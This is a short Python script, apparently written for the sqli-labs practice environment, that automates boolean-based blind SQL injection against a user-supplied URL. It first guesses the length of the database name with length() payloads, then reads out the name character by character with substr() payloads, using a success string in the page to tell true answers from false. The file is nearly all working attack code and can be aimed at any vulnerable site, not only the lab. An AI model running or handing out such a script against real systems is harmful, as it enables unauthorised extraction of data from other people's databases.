'''sqli-lab简单注入'''
import requests
url=input('url:')
for i in range(20):
    plo1="'and length(database())={}--+".format(i)
    re=requests.get(url+plo1)
    if 'are in' in re.text:
        print(i)
        break
char=list('qazxswedcrfvtgbyhnujmiklopWQAZXSEDCVFRTGBNHYUJMKIOPL1234567890')
name1=''
def name(i,n):
    global name1
    plo2="'and substr(database(),{},1)='{}'--+".format(i,n)
    re=requests.get(url+plo2)
    if 'are in' in re.text:
        print(n)
        name1+=n
for ii in range(int(i+1)):
    for n in char:
        name(ii,n)
print(name1)